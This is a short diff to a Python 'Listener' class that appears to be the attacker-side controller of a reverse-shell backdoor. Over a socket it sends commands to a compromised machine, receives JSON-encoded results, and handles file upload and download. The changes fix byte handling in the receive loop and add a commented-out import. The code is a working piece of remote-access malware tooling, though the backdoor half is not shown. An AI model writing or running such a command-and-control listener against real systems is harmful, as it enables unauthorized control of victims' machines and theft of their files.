@@ -2,6 +2,7 @@
 
 import base64  # https://docs.python.org/3/library/base64.html
 import json  # https://docs.python.org/3/library/json.html
+# import shlex  # https://docs.python.org/3/library/shlex.html
 import socket  # https://docs.python.org/3/library/socket.html
 
 
@@ -20,10 +21,10 @@ class Listener:
         self.connection.send(json_data)
 
     def reliable_receive(self):
-        json_data = ""
+        json_data = b""
         while True:
             try:
-                json_data = json_data + str(self.connection.recv(1024))
+                json_data = json_data + self.connection.recv(1024)
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -33,7 +34,6 @@ class Listener:
         if command[0] == "exit":
             self.connection.close()
             exit()
-
         return self.reliable_receive()
 
     def write_file(self, path, content):
@@ -55,6 +55,7 @@ class Listener:
                 if command[0] == "upload":
                     file_content = self.read_file(command[1])
                     command.append(file_content.decode())
+
                 result = self.execute_remotely(command)
 
                 if command[0] == "download" and "[-] Error " not in result:
